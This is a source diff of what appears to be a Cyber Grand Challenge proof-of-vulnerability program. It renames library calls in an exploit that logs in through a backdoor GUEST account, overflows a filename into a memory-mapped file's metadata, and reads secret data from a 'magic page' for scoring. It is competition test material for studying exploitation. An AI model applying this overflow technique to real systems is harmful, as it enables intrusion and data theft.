@@ -4,7 +4,7 @@ Author: Steve Wood <swood@cromulence.com>
 
 Copyright (c) 2016 Cromulence LLC
 
-Permission is hereby granted, __free of charge, to any person obtaining a copy
+Permission is hereby granted, free of charge, to any person obtaining a copy
 of this software and associated documentation files (the "Software"), to deal
 in the Software without restriction, including without limitation the rights
 to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
@@ -76,7 +76,7 @@ unsigned int new_offset_value;
 	// negotiate a type 2 POV
 	pov_type = 2;
 
-	if (__write(3, &pov_type, sizeof(pov_type)) == -1)
+	if (write(3, &pov_type, sizeof(pov_type)) == -1)
 		_terminate(-1);
 
 	if (receive_bytes(3, &type2_addr, sizeof(type2_addr)) == -1)
@@ -92,22 +92,22 @@ unsigned int new_offset_value;
 	receive_bytes(STDIN, buffer, 7);
 	
 	// login with the backdoor GUEST account
-	__write(STDOUT, "GUEST 2\n", 8);
+	write(STDOUT, "GUEST 2\n", 8);
 
 	// command prompt
 	receive_bytes(STDIN, buffer, 26);
 
 	// get rid of the README.txt file in position 0 of the file directory
 	// this position can be overwritten 
-	__write(STDOUT, "erase README.txt\n", 17);
+	write(STDOUT, "erase README.txt\n", 17);
 
 	// command prompt
 	receive_bytes(STDIN, buffer, 2);
 
 	// make a memory mapped file that can be overwritten to exploit the vuln
-	__strcpy(buffer, "makememfile exploitme.mem 4096\n");
-	// __printf();
-	__write(STDOUT, buffer, __strlen(buffer));
+	strcpy(buffer, "makememfile exploitme.mem 4096\n");
+	// printf();
+	write(STDOUT, buffer, strlen(buffer));
 
 	receive_bytes(STDIN, buffer, 2);
 
@@ -115,34 +115,34 @@ unsigned int new_offset_value;
 	for (i = 0; i < 125; ++i ) {
 
 		sprintf(buffer, "make file$d\n", i);
-		__write(STDOUT, buffer, __strlen(buffer));
+		write(STDOUT, buffer, strlen(buffer));
 
 		receive_bytes(STDIN, buffer, 2);
 	}
 
 	// now its time for the overwrite.  only a max sized filename will reach into the next 
 	// block of the filesystem and overwrite the memory mapped file's info
-	__strcpy(buffer, "make AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
+	strcpy(buffer, "make AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
 
 	// put in the address of the magic page
 	// add two to the end so that it doesn't put a null into the string prematurely
 	*(int *)(buffer+41) = type2_addr + 2;
 
 	buffer[45] = '\n';
-	__write(STDOUT, buffer, 46);
+	write(STDOUT, buffer, 46);
 
 	receive_bytes(STDIN, buffer, 2);
 
-	// the memory mapped file should now point to the magic page so just __read it to get secret data
-	__write(STDOUT, "show exploitme.mem\n", 19);
+	// the memory mapped file should now point to the magic page so just read it to get secret data
+	write(STDOUT, "show exploitme.mem\n", 19);
 
 	receive_bytes(STDIN, buffer, 4);
 
-	// now __write the returned data back to the POV server for scoring
-	__write(3, buffer, 4);
+	// now write the returned data back to the POV server for scoring
+	write(3, buffer, 4);
 
-	// send the command to __exit the CB
-	__write(STDOUT, "__exit\n", 5);
+	// send the command to exit the CB
+	write(STDOUT, "exit\n", 5);
 
 }
 
